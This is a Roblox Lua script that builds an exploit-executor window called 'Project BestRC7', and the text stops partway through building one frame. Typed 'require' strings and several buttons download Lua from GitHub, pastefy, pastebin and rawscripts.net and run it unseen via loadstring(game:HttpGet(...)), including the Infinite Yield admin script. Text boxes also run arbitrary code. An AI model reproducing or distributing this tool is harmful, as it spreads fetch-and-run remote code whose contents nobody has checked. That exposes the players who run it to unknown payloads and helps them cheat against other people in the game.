local gui = Instance.new("ScreenGui")
gui.Name = "Harkinian"
gui.Parent = game.CoreGui

wait(5)

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 500, 0, 300)
main.Position = UDim2.new(0.5, -250, 0.5, -150)
main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
main.Parent = gui

local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1, 0, 0, 35)
topBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
topBar.BorderSizePixel = 0
topBar.Parent = main

local title = Instance.new("TextLabel")
title.Text = "Project BestRC7"
title.Size = UDim2.new(1, -40, 1, 0)
title.Position = UDim2.new(0, 10, 0, 0)
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextXAlignment = Enum.TextXAlignment.Left
title.BackgroundTransparency = 1
title.Parent = topBar

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 35, 1, 0)
closeBtn.Position = UDim2.new(1, -35, 0, 0)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 85, 85)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 18
closeBtn.BackgroundTransparency = 1
closeBtn.Parent = topBar
closeBtn.MouseButton1Click:Connect(function()
	gui:Destroy()
end)

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(1, -20, 1, -90)
TextBox.Position = UDim2.new(0, 10, 0, 45)
TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TextBox.BorderSizePixel = 0
TextBox.Text = "-- script require"
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.Font = Enum.Font.Code
TextBox.TextSize = 18
TextBox.TextWrapped = false
TextBox.ClearTextOnFocus = false
TextBox.MultiLine = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextBox.Parent = main

local execBtn = Instance.new("TextButton")
execBtn.Size = UDim2.new(0, 150, 0, 35)
execBtn.Position = UDim2.new(0.5, -160, 1, -40)
execBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
execBtn.Text = "Execute"
execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
execBtn.Font = Enum.Font.GothamBold
execBtn.TextSize = 18
execBtn.BorderSizePixel = 0
execBtn.Parent = main

local clearBtn = Instance.new("TextButton")
clearBtn.Size = UDim2.new(0, 150, 0, 35)
clearBtn.Position = UDim2.new(0.5, 10, 1, -40)
clearBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
clearBtn.Text = "Clear"
clearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
clearBtn.Font = Enum.Font.GothamBold
clearBtn.TextSize = 18
clearBtn.BorderSizePixel = 0
clearBtn.Parent = main

execBtn.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
local TextBox = TextBox.Text
    if TextBox == 'require(10868847330):pls("'..game.Players.LocalPlayer.Name..'")' then
loadstring(game:HttpGet("https://raw.githubusercontent.com/gitluau/luauexser/refs/heads/main/pHzp8uG1PO962o6qucrlP3AJy17eV3B.lua"))()
end

if TextBox == 'require(15629007042)("'..game.Players.LocalPlayer.Name..'")' then
local gui = Instance.new("ScreenGui")
gui.Name = "require"
gui.Parent = game.CoreGui

local Ui = Instance.new("Frame")
Ui.Size = UDim2.new(0.0, 400, 0.0, 300)
Ui.Position = UDim2.new(0.2, 89, 0.0, - 24)
Ui.BackgroundColor3 = Color3.new(1, 1, 1)
Ui.BorderColor3 = Color3.new(0, 0, 0)
Ui.BorderSizePixel = 0
Ui.Active = true
Ui.BackgroundTransparency = 1
Ui.Draggable = true
Ui.Parent = gui

local ImageLabel = Instance.new("ImageLabel")
ImageLabel.Size = UDim2.new(0.9, 37, 0.9, 28)
ImageLabel.Position = UDim2.new(0.0, 0, 0.0, 0)
ImageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
ImageLabel.ImageColor3 = Color3.new(1, 1, 1)
ImageLabel.Image = "rbxassetid://14902240136"
ImageLabel.ImageTransparency = 0.4
ImageLabel.Parent = Ui

ImageLabel.BackgroundTransparency = 1

local  close = Instance.new("TextButton")
 close.Size = UDim2.new(0.2, 0, 0.1, 0)
 close.Position = UDim2.new(0.7, 32, 0.0, 5)
 close.BackgroundColor3 = Color3.new(1, 1, 1)
 close.BorderColor3 = Color3.new(0, 0, 0)
 close.BorderSizePixel = 0
 close.Text = "Close"
 close.BackgroundTransparency = 0.5
 close.TextColor3 = Color3.new(0, 0, 0)
 close.Font = Enum.Font.Montserrat
 close.Parent = Ui
close.TextSize = 19
close.MouseButton1Click:Connect(function()
Ui:Remove()
end)

local Ser = Instance.new("TextBox")
Ser.Size = UDim2.new(0.3, 80, 0.1, 0)
Ser.Position = UDim2.new(0.2, 28, 0.0, 5)
Ser.BackgroundColor3 = Color3.new(1, 1, 1)
Ser.BorderColor3 = Color3.new(0, 0, 0)
Ser.BorderSizePixel = 0
Ser.Text = ""
Ser.TextColor3 = Color3.new(0, 0, 0)
Ser.BackgroundTransparency = 0.5
Ser.Font = Enum.Font.Montserrat
Ser.PlaceholderText = "Search His Thoughts"
Ser.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
Ser.TextColor3 = Color3.new(0, 0, 0)
Ser.TextSize = 19
Ser.Parent = Ui

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(0.9, 29, 0.7, 6)
TextBox.Position = UDim2.new(0.0, 4, 0.1, 9)
TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
TextBox.BorderColor3 = Color3.new(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Text = ""
TextBox.PlaceholderText = "Execute His Thoughts"
TextBox.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextColor3 = Color3.new(0, 0, 0)
TextBox.BackgroundTransparency = 0.5
TextBox.Font = Enum.Font.Montserrat
TextBox.TextSize = 17
TextBox.Parent = Ui
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.ClearTextOnFocus = false
TextBox.MultiLine = true
TextBox.TextWrapped = true

local Exe = Instance.new("TextButton")
Exe.Size = UDim2.new(0.4, 19, 0.1, 0)
Exe.Position = UDim2.new(0.0, 4, 0.7, 50)
Exe.BackgroundColor3 = Color3.new(1, 1, 1)
Exe.BorderColor3 = Color3.new(0, 0, 0)
Exe.BorderSizePixel = 0
Exe.Text = "Execute"
Exe.BackgroundTransparency = 0.5
Exe.TextColor3 = Color3.new(0, 0, 0)
Exe.Font = Enum.Font.Montserrat
Exe.Parent = Ui
Exe.TextSize = 19
Exe.MouseButton1Click:Connect(function()
assert(loadstring(TextBox.Text))()
end)

local clea = Instance.new("TextButton")
clea.Size = UDim2.new(0.4, 50, 0.1, 0)
clea.Position = UDim2.new(0.4, 23, 0.7, 50)
clea.BackgroundColor3 = Color3.new(1, 1, 1)
clea.BorderColor3 = Color3.new(0, 0, 0)
clea.BorderSizePixel = 0
clea.Text = "Clear"
clea.BackgroundTransparency = 0.5
clea.TextColor3 = Color3.new(0, 0, 0)
clea.Font = Enum.Font.Montserrat
clea.Parent = Ui
clea.TextSize = 19
clea.MouseButton1Click:Connect(function()
TextBox.Text = ""
end)

local Scr = Instance.new("ScrollingFrame")
Scr.Size = UDim2.new(0.9, 29, 0.7, 6)
Scr.Position = UDim2.new(0.0, 4, 0.1, 9)
Scr.BackgroundColor3 = Color3.new(1, 1, 1)
Scr.BorderColor3 = Color3.new(0, 0, 0)
Scr.BorderSizePixel = 0
Scr.Parent = Ui
Scr.ScrollBarThickness = 0
Scr.Visible = false

Scr.BackgroundTransparency = 1

local Mrbean = Instance.new("TextButton")
Mrbean.Size = UDim2.new(0.9, 39, 0.0, 29)
Mrbean.Position = UDim2.new(0.0, 0, 0.0, 0)
Mrbean.BackgroundColor3 = Color3.new(1, 1, 1)
Mrbean.BorderColor3 = Color3.new(0, 0, 0)
Mrbean.BorderSizePixel = 0
Mrbean.Text = "Goku"
Mrbean.BackgroundTransparency = 0.5
Mrbean.TextColor3 = Color3.new(0, 0, 0)
Mrbean.Font = Enum.Font.Montserrat
Mrbean.Parent = Scr
Mrbean.TextSize = 19
Mrbean.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-yong-shelon-g-29376"))()
end)

local Steve = Instance.new("TextButton")
Steve.Size = UDim2.new(0.9, 39, 0.0, 29)
Steve.Position = UDim2.new(0.0, 0, 0.0, 33)
Steve.BackgroundColor3 = Color3.new(1, 1, 1)
Steve.BorderColor3 = Color3.new(0, 0, 0)
Steve.BorderSizePixel = 0
Steve.Text = "Deku"
Steve.BackgroundTransparency = 0.5
Steve.TextColor3 = Color3.new(0, 0, 0)
Steve.Font = Enum.Font.Montserrat
Steve.Parent = Scr
Steve.TextSize = 19
Steve.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Infinite-Yield-ss-id-3-31749"))()
end)

local Infinite = Instance.new("TextButton")
Infinite.Size = UDim2.new(0.9, 39, 0.0, 29)
Infinite.Position = UDim2.new(0.0, 0, 0.0, 65)
Infinite.BackgroundColor3 = Color3.new(1, 1, 1)
Infinite.BorderColor3 = Color3.new(0, 0, 0)
Infinite.BorderSizePixel = 0
Infinite.Text = "KJ"
Infinite.BackgroundTransparency = 0.5
Infinite.TextColor3 = Color3.new(0, 0, 0)
Infinite.Font = Enum.Font.Montserrat
Infinite.Parent = Scr
Infinite.TextSize = 19
Infinite.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/HaVCm8rg/raw"))()
end)

local She = Instance.new("TextButton")

local R6 = Instance.new("TextButton")
R6.Size = UDim2.new(0.1, 39, 0.1, 0)
R6.Position = UDim2.new(0.0, 4, 0.7, 50)
R6.BackgroundColor3 = Color3.new(1, 1, 1)
R6.BorderColor3 = Color3.new(0, 0, 0)
R6.BorderSizePixel = 0
R6.Text = "RE"
R6.BackgroundTransparency = 0.5
R6.TextColor3 = Color3.new(0, 0, 0)
R6.Font = Enum.Font.Montserrat
R6.Parent = Ui
R6.TextSize = 19
R6.Visible = false
R6.MouseButton1Click:Connect(function()
if game.Players.LocalPlayer.Character then
game.Players.LocalPlayer.Character.Humanoid.Health = 0
end
end)

local Ree = Instance.new("TextButton")
Ree.Size = UDim2.new(0.1, 39, 0.1, 0)
Ree.Position = UDim2.new(0.7, 34, 0.7, 50)
Ree.BackgroundColor3 = Color3.new(1, 1, 1)
Ree.BorderColor3 = Color3.new(0, 0, 0)
Ree.BorderSizePixel = 0
Ree.Text = "R6"
Ree.BackgroundTransparency = 0.5
Ree.TextColor3 = Color3.new(0, 0, 0)
Ree.Font = Enum.Font.Montserrat
Ree.Parent = Ui
Ree.TextSize = 19
Ree.Visible = false
Ree.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/9BFcHqfK"))("Copyright ERROR_CODE ECCS Co")
end)

local ygcw = Instance.new("TextButton")
ygcw.Size = UDim2.new(0.5, 23, 0.1, 0)
ygcw.Position = UDim2.new(0.1, 47, 0.7, 50)
ygcw.BackgroundColor3 = Color3.new(1, 1, 1)
ygcw.BorderColor3 = Color3.new(0, 0, 0)
ygcw.BorderSizePixel = 0
ygcw.Text = "TEAM_NOKIA666"
ygcw.BackgroundTransparency = 0.5
ygcw.TextColor3 = Color3.new(0, 0, 0)
ygcw.Font = Enum.Font.Montserrat
ygcw.Parent = Ui
ygcw.TextSize = 19

local Shee = Instance.new("TextButton")
Shee.Size = UDim2.new(0.2, 20, 0.1, 0)
Shee.Position = UDim2.new(0.0, 4, 0.0, 5)
Shee.BackgroundColor3 = Color3.new(1, 1, 1)
Shee.BorderColor3 = Color3.new(1, 1, 1)
Shee.BorderSizePixel = 0
Shee.Text = "Sheldoni"
Shee.BackgroundTransparency = 0.5
Shee.TextColor3 = Color3.new(0, 0, 0)
Shee.Font = Enum.Font.Montserrat
Shee.Parent = Ui
Shee.TextSize = 19
Shee.Visible = false
Shee.MouseButton1Click:Connect(function()
clea.Visible = true
Exe.Visible = true
Scr.Visible = false
Shee.Visible = false
R6.Visible = false
Ree.Visible = false
ygcw.Visible = false
She.Visible = true
TextBox.Visible = true
end)

She.Size = UDim2.new(0.2, 20, 0.1, 0)
She.Position = UDim2.new(0.0, 4, 0.0, 5)
She.BackgroundColor3 = Color3.new(1, 1, 1)
She.BorderColor3 = Color3.new(1, 1, 1)
She.BorderSizePixel = 0
She.Text = "Sheldoni"
She.BackgroundTransparency = 0.5
She.TextColor3 = Color3.new(0, 0, 0)
She.Font = Enum.Font.Montserrat
She.Parent = Ui
She.TextSize = 19
She.MouseButton1Click:Connect(function()
clea.Visible = false
Exe.Visible = false
Scr.Visible = true
Shee.Visible = true
R6.Visible = true
Ree.Visible = true
ygcw.Visible = true
She.Visible = false
TextBox.Visible = false
end)

-- Função para criar botões no Scr automaticamente
local function createButton(text, posY, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9, 39, 0.0, 29)
    btn.Position = UDim2.new(0.0, 0, 0.0, posY)
    btn.BackgroundColor3 = Color3.new(1, 1, 1)
    btn.BorderColor3 = Color3.new(0, 0, 0)
    btn.BorderSizePixel = 0
    btn.Text = text
    btn.BackgroundTransparency = 0.5
    btn.TextColor3 = Color3.new(0, 0, 0)
    btn.Font = Enum.Font.Montserrat
    btn.TextSize = 19
    btn.Parent = Scr
    btn.MouseButton1Click:Connect(callback)
end

-- Y offset inicial para os novos botões (após o botão Infinite Yield que termina em 65+33 = 98)
local offsetY = 98
local spacing = 33

-- Lista de botões
local buttons = {
    { "Minos", "https://raw.githubusercontent.com/KRNL2/3dx/main/VEREUS" },
    { "Jojo", "https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Xester%20FD.txt" },
    { "Garou", "https://raw.githubusercontent.com/KRNL2/haker/main/The%20Glitch" },
    { "Genos", "https://raw.githubusercontent.com/KRNL2/haker/main/The%20Glitch" }
}

-- Criação dos botões
for i, data in ipairs(buttons) do
    createButton(data[1], offsetY + ((i - 1) * spacing), function()
        loadstring(game:HttpGet(data[2]))()
    end)
end
end

if TextBox == 'require(123255432303221):Pload("'..game.Players.LocalPlayer.Name..'")' then
loadstring(game:HttpGet("https://pastefy.app/cDHeL11e/raw"))()
end

if TextBox == 'require(7004742023).Kick("'..game.Players.LocalPlayer.Name..'")' then
loadstring(game:HttpGet("https://pastefy.app/Nqmbgs61/raw/"))()
end

if TextBox == 'require(15654695146)("'..game.Players.LocalPlayer.Name..'")' then
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-yong-shelon-g-29376"))()
end

if TextBox == 'require(75885601008770)("'..game.Players.LocalPlayer.Name..'")' then
loadstring(game:HttpGet("https://pastefy.app/HmVsORN2/raw/"))()
end

if TextBox == 'require(6483993400).no("'..game.Players.LocalPlayer.Name..'")' then
loadstring(game:HttpGet("https://pastebin.com/raw/j09BnGB3"))()
end

if TextBox == 'require(12350030542).RC7("'..game.Players.LocalPlayer.Name..'")' then
local Topbar = Instance.new("Frame")
Topbar.Size = UDim2.new(0.0, 330, 0.0, 29)
Topbar.Position = UDim2.new(0.5, -2, 0.0, -26)
Topbar.BackgroundColor3 = Color3.new(1, 1, 1)
Topbar.BorderColor3 = Color3.new(0, 0, 0)
Topbar.BorderSizePixel = 0
Topbar.Active = true
Topbar.BackgroundTransparency = 1
Topbar.Draggable = true
Topbar.Parent = gui

local Top = Instance.new("ImageLabel")
Top.Size = UDim2.new(0.9, 34, 0.9, 4)
Top.Position = UDim2.new(0.0, 0, 0.0, 0)
Top.BackgroundColor3 = Color3.new(0, 0, 0)
Top.ImageColor3 = Color3.new(1, 1, 1)
Top.Image = "rbxassetid://129165460566731"
Top.ImageTransparency = 0
Top.Parent = Topbar

Top.BackgroundTransparency = 1

local Ui = Instance.new("Frame")
Ui.Size = UDim2.new(0.9, 34, 0.9, 266)
Ui.Position = UDim2.new(0.0, 0, 0.9, 5)
Ui.BackgroundColor3 = Color3.new(1, 1, 1)
Ui.BorderColor3 = Color3.new(0, 0, 0)
Ui.BorderSizePixel = 0
Ui.Active = false
Ui.BackgroundTransparency = 1
Ui.Draggable = true
Ui.Parent = Topbar

local Ui1 = Instance.new("ImageLabel")
Ui1.Size = UDim2.new(0.8, 16, 0.9, 30)
Ui1.Position = UDim2.new(0.0, -1, 0.0, -1)
Ui1.BackgroundColor3 = Color3.new(0, 0, 0)
Ui1.ImageColor3 = Color3.new(1, 1, 1)
Ui1.Image = "rbxassetid://103220137001093"
Ui1.ImageTransparency = 0
Ui1.Parent = Ui

Ui1.BackgroundTransparency = 1

local Rc7 = Instance.new("ImageLabel")
Rc7.Size = UDim2.new(0.0, 53, 0.9, 30)
Rc7.Position = UDim2.new(0.7, 47, 0.0, -1)
Rc7.BackgroundColor3 = Color3.new(0, 0, 0)
Rc7.ImageColor3 = Color3.new(1, 1, 1)
Rc7.Image = "rbxassetid://71877621493624"
Rc7.ImageTransparency = 0
Rc7.Parent = Ui

Rc7.BackgroundTransparency = 1

local Executor = Instance.new("ImageLabel")
Executor.Size = UDim2.new(0.8, 42, 0.9, 14)
Executor.Position = UDim2.new(0.0, 11, 0.0, 11)
Executor.BackgroundColor3 = Color3.new(0, 0, 0)
Executor.ImageColor3 = Color3.new(1, 1, 1)
Executor.Image = "rbxassetid://89070648306751"
Executor.ImageTransparency = 0
Executor.Parent = Ui1
Executor.Visible = false

Executor.BackgroundTransparency = 1

local Hub = Instance.new("ImageLabel")
Hub.Size = UDim2.new(0.3, 19, 0.5, 52)
Hub.Position = UDim2.new(0.0, 9, 0.3, 0)
Hub.BackgroundColor3 = Color3.new(0, 0, 0)
Hub.ImageColor3 = Color3.new(1, 1, 1)
Hub.Image = "rbxassetid://89182833001329"
Hub.ImageTransparency = 0
Hub.Parent = Rc7
Hub.Visible = false

Hub.BackgroundTransparency = 1

local Submit = Instance.new("TextButton")
Submit.Size = UDim2.new(0.3, 9, 0.0, 21)
Submit.Position = UDim2.new(0.0, 95, 0.5, 6)
Submit.BackgroundColor3 = Color3.new(0, 0, 0)
Submit.BorderColor3 = Color3.new(0, 0, 0)
Submit.BorderSizePixel = 0
Submit.Text = ""
Submit.BackgroundTransparency = 1
Submit.TextColor3 = Color3.new(255, 255, 255)
Submit.Font = Enum.Font.Code
Submit.Parent = Ui1
Submit.MouseButton1Click:Connect(function()
wait(1)
Submit.Visible = false
Hub.Visible = true
Executor.Visible = true
end)

local Ro = Instance.new("TextButton")
Ro.Size = UDim2.new(0.9, 2, 0.2, -10)
Ro.Position = UDim2.new(0.0, 0, 0.7, -4)
Ro.BackgroundColor3 = Color3.new(0, 0, 0)
Ro.BorderColor3 = Color3.new(0, 0, 0)
Ro.BorderSizePixel = 0
Ro.Text = ""
Ro.BackgroundTransparency = 1 
Ro.TextColor3 = Color3.new(255, 255, 255)
Ro.Font = Enum.Font.Code
Ro.Parent = Hub
Ro.MouseButton1Click:Connect(function()
loadstring(game:GetObjects("rbxassetid://364364477")[1].Source)()
end)

local x = Instance.new("TextButton")
x.Size = UDim2.new(0.1, 0, 0.9, 5)
x.Position = UDim2.new(0.9, 0, 0.0, 0)
x.BackgroundColor3 = Color3.new(0, 0, 0)
x.BorderColor3 = Color3.new(0, 0, 0)
x.BorderSizePixel = 0
x.Text = ""
x.BackgroundTransparency = 1
x.TextColor3 = Color3.new(255, 255, 255)
x.Font = Enum.Font.Code
x.Parent = Topbar
x.MouseButton1Click:Connect(function()
Topbar:Remove()
end)

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(0.5, 105, 0.5, 52)
TextBox.Position = UDim2.new(0.0, 26, 0.0, 0)
TextBox.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox.BorderColor3 = Color3.new(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Text = ""
TextBox.TextColor3 = Color3.new(0, 0, 0)
TextBox.BackgroundTransparency = 1
TextBox.Font = Enum.Font.Code
TextBox.TextSize = 15
TextBox.Parent = Executor
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextBox.ClearTextOnFocus = false
TextBox.MultiLine = true
TextBox.TextWrapped = true
TextBox.TextEditable = true

local Exe = Instance.new("TextButton")
Exe.Size = UDim2.new(0.3, 9, 0.0, 26)
Exe.Position = UDim2.new(0.0, 89, 0.6, 39)
Exe.BackgroundColor3 = Color3.new(0, 0, 0)
Exe.BorderColor3 = Color3.new(0, 0, 0)
Exe.BorderSizePixel = 0
Exe.Text = ""
Exe.BackgroundTransparency = 1
Exe.TextColor3 = Color3.new(255, 255, 255)
Exe.Font = Enum.Font.Code
Exe.Parent = Executor
Exe.MouseButton1Click:Connect(function()
assert(loadstring(TextBox.Text))()
end)

local Clea = Instance.new("TextButton")
Clea.Size = UDim2.new(0.3, 14, 0.0, 26)
Clea.Position = UDim2.new(0.5, 42, 0.6, 39)
Clea.BackgroundColor3 = Color3.new(0, 0, 0)
Clea.BorderColor3 = Color3.new(0, 0, 0)
Clea.BorderSizePixel = 0
Clea.Text = ""
Clea.BackgroundTransparency = 1
Clea.TextColor3 = Color3.new(255, 255, 255)
Clea.Font = Enum.Font.Code
Clea.Parent = Executor
Clea.MouseButton1Click:Connect(function()
TextBox.Text = " "
end)
end

if TextBox == 'require(1296392639169).Fire("'..game.Players.LocalPlayer.Name..'")' then
local Ui = Instance.new("Frame")
Ui.Size = UDim2.new(0.0, 372, 0.0, 150)
Ui.Position = UDim2.new(0.2, 34, 0.2, 19)
Ui.BackgroundColor3 = Color3.new(0, 0, 0)
Ui.BorderColor3 = Color3.new(1, 1, 1)
Ui.BorderSizePixel = 4
Ui.Active = true
Ui.BackgroundTransparency = 0.6
Ui.Draggable = true
Ui.Parent = gui
Ui.Visible = true

local Scr = Instance.new("ScrollingFrame")
Scr.Size = UDim2.new(0.9, 37, 0.5, 35)
Scr.Position = UDim2.new(0.0, 0, 0.3,- 4)
Scr.BackgroundColor3 = Color3.new(0, 0, 0)
Scr.BorderColor3 = Color3.new(0, 0, 0)
Scr.BorderSizePixel = 0
Scr.Parent = Ui

Scr.BackgroundTransparency = 1

local Text = Instance.new("TextLabel")
Text.Size = UDim2.new(0.3, 0, 0.1, 2)
Text.Position = UDim2.new(0.3, 20, 0.0, 0)
Text.BackgroundColor3 = Color3.new(0, 0, 0)
Text.BorderColor3 = Color3.new(0, 0, 0)
Text.BorderSizePixel = 1
Text.Text = "Commands"
Text.BackgroundTransparency = 1
Text.TextColor3 = Color3.new(255, 255, 255)
Text.Font = Enum.Font.SourceSansSemibold
Text.TextSize = 15
Text.Parent = Ui

local UiStroke = Instance.new("UIStroke")
UiStroke.Color = Color3.new(0, 0, 0)
UiStroke.Thickness = 0.4
UiStroke.Parent = Text

local Sit = Instance.new("TextLabel")
Sit.Size = UDim2.new(0.9, 0, 0.0, 19)
Sit.Position = UDim2.new(0.0, 0, 0.0, 9)
Sit.BackgroundColor3 = Color3.new(0, 0, 0)
Sit.BorderColor3 = Color3.new(0, 0, 0)
Sit.BorderSizePixel = 1
Sit.Text = "Name: kick me | Rank : 0 Non-Admin | AKA: kick me"
Sit.BackgroundTransparency = 1
Sit.TextColor3 = Color3.new(255, 255, 255)
Sit.Font = Enum.Font.SourceSansSemibold
Sit.Parent = Scr
Sit.TextSize = 16
Sit.TextXAlignment = Enum.TextXAlignment.Left

local Comm = Instance.new("TextLabel")
Comm.Size = UDim2.new(0.9, 0, 0.0, 19)
Comm.Position = UDim2.new(0.0, 0, 0.0, -5)
Comm.BackgroundColor3 = Color3.new(0, 0, 0)
Comm.BorderColor3 = Color3.new(0, 0, 0)
Comm.BorderSizePixel = 1
Comm.Text = "Name: kill me | Rank : 0 Non-Admin | AKA: kill me"
Comm.BackgroundTransparency = 1
Comm.TextColor3 = Color3.new(255, 255, 255)
Comm.Font = Enum.Font.SourceSansSemibold
Comm.Parent = Scr
Comm.TextSize = 14
Comm.TextXAlignment = Enum.TextXAlignment.Left

local duck = Instance.new("TextLabel")
duck.Size = UDim2.new(0.9, 0, 0.0, 19)
duck.Position = UDim2.new(0.0, 0, 0.0, 25)
duck.BackgroundColor3 = Color3.new(0, 0, 0)
duck.BorderColor3 = Color3.new(0, 0, 0)
duck.BorderSizePixel = 0
duck.Text = "Name: duck me | Rank : 0 Non-Admin | AKA: duck me"
duck.BackgroundTransparency = 1
duck.TextColor3 = Color3.new(255, 255, 255)
duck.Font = Enum.Font.SourceSansSemibold
duck.Parent = Scr
duck.TextSize = 14
duck.TextXAlignment = Enum.TextXAlignment.Left

local Text1 = Instance.new("UIStroke")
Text1.Color = Color3.new(0, 0, 0)
Text1.Thickness = 0.4
Text1.Parent = Comm

local sitop = Instance.new("TextLabel")
sitop.Size = UDim2.new(0.9, 0, 0.0, 19)
sitop.Position = UDim2.new(0.0, 0, 0.0, 39)
sitop.BackgroundColor3 = Color3.new(0, 0, 0)
sitop.BorderColor3 = Color3.new(0, 0, 0)
sitop.BorderSizePixel = 0
sitop.Text = "Name: sit me | Rank : 0 Non-Admin | AKA: sit me"
sitop.BackgroundTransparency = 1
sitop.TextColor3 = Color3.new(255, 255, 255)
sitop.Font = Enum.Font.SourceSansSemibold
sitop.Parent = Scr
sitop.TextSize = 14
sitop.TextXAlignment = Enum.TextXAlignment.Left

local exlode = Instance.new("TextLabel")
exlode.Size = UDim2.new(0.9, 0, 0.0, 19)
exlode.Position = UDim2.new(0.0, 0, 0.0, 53)
exlode.BackgroundColor3 = Color3.new(0, 0, 0)
exlode.BorderColor3 = Color3.new(0, 0, 0)
exlode.BorderSizePixel = 0
exlode.Text = "Name: boom me | Rank : 0 Non-Admin | AKA: boom me"
exlode.BackgroundTransparency = 1
exlode.TextColor3 = Color3.new(255, 255, 255)
exlode.Font = Enum.Font.SourceSansSemibold
exlode.Parent = Scr
exlode.TextSize = 14
exlode.TextXAlignment = Enum.TextXAlignment.Left

local X = Instance.new("TextButton")
X.Size = UDim2.new(0.1, 0, 0.1, 5)
X.Position = UDim2.new(0.8, 38, 0.0,- 2)
X.BackgroundColor3 = Color3.new(0, 0, 0)
X.BorderColor3 = Color3.new(0, 0, 0)
X.BorderSizePixel = 0
X.Text = "X"
X.BackgroundTransparency = 1
X.TextColor3 = Color3.new(1, 0, 0)
X.Font = Enum.Font.SourceSansSemibold
X.Parent = Ui
X.TextSize = 30
X.MouseButton1Click:Connect(function()
Ui.Visible = false
end)

local command = Instance.new("TextBox")

local back = Instance.new("ImageButton")

local Rc = Instance.new("Frame")

local mr = Instance.new("ImageButton")
mr.Size = UDim2.new(0.0, 75, 0.0, 74)
mr.Position = UDim2.new(0.8, 50, 0.6, 29)
mr.BackgroundColor3 = Color3.new(0, 0, 0)
mr.ImageColor3 = Color3.new(1, 1, 1)
mr.Image = "rbxassetid://123852508876370"
mr.ImageTransparency = 0
mr.Parent = gui
mr.Visible = true
mr.MouseButton1Click:Connect(function()
mr.Visible = false
back.Visible = true
back.Rotation = back.Rotation - 9
wait(0.001)
back.Rotation = back.Rotation - 9
wait(0.001)
back.Rotation = back.Rotation - 9
wait(0.001)
back.Rotation = back.Rotation - 9
wait(0.001)
back.Rotation = back.Rotation - 9
wait(0.001)
back.Rotation = back.Rotation - 9
wait(0.001)
back.Rotation = back.Rotation - 9
wait(0.001)
back.Rotation = back.Rotation - 9
wait(0.001)
back.Rotation = back.Rotation - 9
wait(0.001)
back.Rotation = back.Rotation - 9
Rc.Visible = true
end)

mr.BackgroundTransparency = 1

back.Size = UDim2.new(0.0, 95, 0.0, 64)
back.Position = UDim2.new(0.8, 46, 0.6, 33)
back.BackgroundColor3 = Color3.new(0, 0, 0)
back.ImageColor3 = Color3.new(1, 1, 1)
back.Image = "rbxassetid://138720776388826"
back.ImageTransparency = 0
back.Parent = gui
back.Visible = false
back.Rotation = 90
back.MouseButton1Click:Connect(function()
back.Rotation = back.Rotation + 9
wait(0.001)
back.Rotation = back.Rotation + 9
wait(0.001)
back.Rotation = back.Rotation + 9
wait(0.001)
back.Rotation = back.Rotation + 9
wait(0.001)
back.Rotation = back.Rotation + 9
wait(0.001)
back.Rotation = back.Rotation + 9
wait(0.001)
back.Rotation = back.Rotation + 9
wait(0.001)
back.Rotation = back.Rotation + 9
wait(0.001)
back.Rotation = back.Rotation + 9
wait(0.001)
back.Rotation = back.Rotation + 9
Rc.Visible = false
back.Visible = false
back.Rotation = 90
mr.Visible = true
end)

back.BackgroundTransparency = 1

Rc.Size = UDim2.new(0.9, 139, 0.0, 75)
Rc.Position = UDim2.new(0.0, -229, 0.0, 0)
Rc.BackgroundColor3 = Color3.new(1, 1, 1)
Rc.BorderColor3 = Color3.new(0, 0, 0)
Rc.BorderSizePixel = 3
Rc.Active = false
Rc.BackgroundTransparency = 0.9
Rc.Draggable = true
Rc.Visible = false
Rc.Parent = back

local backo = Instance.new("Frame")
backo.Size = UDim2.new(0.9, 12, 0.9, -2)
backo.Position = UDim2.new(0.0, 5, 0.0, 5)
backo.BackgroundColor3 = Color3.new(0, 0, 0)
backo.BorderColor3 = Color3.new(0, 0, 0)
backo.BorderSizePixel = 0
backo.Active =  false
backo.BackgroundTransparency = 0.3
backo.Draggable = true
backo.Parent = Rc

local white = Instance.new("Frame")
white.Size = UDim2.new(0.9, 21, 0.9, 7)
white.Position = UDim2.new(0.0, 0, 0.0, 0)
white.BackgroundColor3 = Color3.new(1, 1, 1)
white.BorderColor3 = Color3.new(0, 0, 0)
white.BorderSizePixel = 0
white.Active = false
white.BackgroundTransparency = 0.8
white.Draggable = true
